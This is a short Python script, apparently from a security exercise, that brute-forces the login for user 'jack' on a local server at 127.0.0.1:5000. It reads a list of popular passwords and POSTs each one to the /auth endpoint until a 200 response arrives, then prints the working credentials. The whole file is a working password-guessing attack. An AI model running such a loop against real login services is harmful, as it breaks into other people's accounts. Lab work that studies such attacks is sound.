import requests

with open('../pop_passwords.txt') as f:
    pop_passwords = f.read()

pop_passwords = pop_passwords.split('\n')
i = 0


def bad_password_generator():
    global i
    password = pop_passwords[i]
    i += 1
    return password


login = 'jack'
success = False
while not success:
    password = bad_password_generator()
    data = {'login': login, 'password': password}

    response = requests.post('http://127.0.0.1:5000/auth', json=data)
    if response.status_code == 200:
        print(data)
        success = True
